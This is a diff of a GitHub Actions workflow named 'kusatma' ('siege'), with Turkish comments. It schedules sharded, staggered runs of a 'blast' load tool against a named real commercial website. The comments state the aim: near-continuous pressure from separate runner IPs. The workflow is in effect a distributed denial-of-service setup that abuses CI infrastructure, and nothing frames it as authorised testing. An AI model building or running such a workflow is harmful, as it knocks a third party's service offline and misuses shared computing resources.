@@ -1,7 +1,7 @@
 name: kusatma
 
-# Elle de tetiklenebilir; zamanlanmış çalışma her 30 dakikada bir yeni tur açar.
-# Her tur 55 dakika koşar, 4 shard kademeli başlar -> pratikte kesintisiz baskı.
+# Elle de tetiklenebilir; zamanlanmis calisma her 30 dakikada bir yeni tur acar.
+# Her tur 55 dakika kosar, 4 shard kademeli baslar -> pratikte kesintisiz baski.
 on:
   workflow_dispatch:
     inputs:
@@ -25,10 +25,14 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        # Her shard ayri bir GitHub runner = ayri bir IP.
+        # Her shard ayri bir runner = ayri bir IP.
         shard: [1, 2, 3, 4]
     steps:
       - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: "22"
 
       - name: Kademeli baslat
         run: sleep $(( ${{ matrix.shard }} * 7 ))
@@ -37,4 +41,4 @@ jobs:
         env:
           C: ${{ github.event.inputs.concurrency || '25' }}
           D: ${{ github.event.inputs.duration || '3000' }}
-        run: bash run.sh "$C" "$D" "https://www.antalyatransferi.com/"
+        run: node blast.mjs --url https://www.antalyatransferi.com/ --concurrency "$C" --seconds "$D" --timeout 25000
